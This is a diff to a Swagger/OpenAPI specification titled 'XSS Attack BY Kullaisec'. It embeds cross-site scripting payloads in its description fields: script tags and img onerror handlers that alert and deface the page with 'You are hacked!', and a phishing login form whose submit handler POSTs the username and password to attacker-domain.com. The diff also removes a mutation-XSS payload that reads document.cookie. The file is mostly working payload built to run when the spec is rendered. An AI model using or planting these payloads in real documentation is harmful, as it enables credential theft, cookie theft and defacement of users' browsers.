@@ -2,6 +2,12 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Kullaisec
   description: |
+    <marquee behavior="scroll" direction="left" style="font-size:24px;color:red;">Hacked by Kullaisec</marquee>
+    <img src="https://via.placeholder.com/150" onerror="alert('Image load failed! XSS executed.');">
+    <script>
+      alert('Warning: JavaScript Executed!');
+      document.body.innerHTML += '<h1 style="color:red;">You are hacked!</h1>';
+    </script>
     <form action="#" onsubmit="fetch('https://attacker-domain.com/steal', {method: 'POST', body: new URLSearchParams({username: this.username.value, password: this.password.value})}); alert('Credentials sent to attacker!'); return false;">
       <label for="username">Username:</label><br>
       <input type="text" id="username" name="username"><br>
@@ -24,7 +30,7 @@ paths:
     get:
       summary: Displays a malicious login page
       description: |
-        An endpoint that serves a login page for demonstration purposes of XSS.
+        An endpoint that serves a login page with an embedded XSS attack for demonstration purposes.
       responses:
         '200':
           description: HTML login page
@@ -37,7 +43,9 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <marquee behavior="alternate" style="color:blue;font-size:18px;">Hacked by Kullaisec</marquee>
+            <img src="nonexistent.png" onerror="alert('XSS Image Trigger!');">
+            <script>alert('ID parameter exploited!');</script>
           format: int64
           in: path
           name: id
